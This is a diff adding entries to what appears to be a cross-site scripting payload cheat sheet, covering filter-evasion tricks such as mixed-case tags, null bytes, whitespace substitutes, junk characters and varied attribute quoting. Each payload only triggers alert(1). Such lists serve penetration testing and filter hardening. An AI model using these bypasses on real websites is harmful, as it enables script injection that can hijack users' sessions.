@@ -39,5 +39,36 @@
      <form id=test /><button form=test formaction=javascript:alert(1)>
      <event-source src=javascript:alert(1)>
      
-   *Dynamically evaluated styles
+   *Dynamically evaluated styles (css)
+    <x:style=x:expression(alert(1))>
+    <x style=behavior:url(#default#time2) onbegin=alert(1)>
     
+  *HTML
+  -Tag Name-
+   ---alter case---
+    <iMg onerror=alert(1) src=a>
+    ---Nullbytes---
+    <[%00]img onerror=alert(1) src=a>
+    <i[%00]mg onerror=alert(1) src=a>
+    ---event handlers---
+    <x onclick=alert(1) src=a>Click here</x>
+    ---Replace space---
+    <img/onerror=alert(1) src=a>
+    <img[%09]onerror=alert(1) src=a>
+    <img[%0d]onerror=alert(1) src=a>
+    <img[%0a]onerror=alert(1) src=a>
+    <img/"onerror=alert(1) src=a>
+    <img/'onerror=alert(1) src=a>
+    <img/anyjunk/onerror=alert(1) src=a>
+    ---junk to hide tag name ---
+    <script/somejunk>alert(1)</script>
+    ---Attribute names eg those starting with on---
+    <img o[%00]nerror=alert(1) src=a>
+    ---Attribute Delimeters---
+    <img onerror="alert(1)"src=a>
+    <img onerror='alert(1)'src=a>
+    <img onerror=`alert(1)`src=a>
+    <img src=`a` onerror=alert(1)>
+    <img/onerror="alert(1)"src=a>
+    
+   
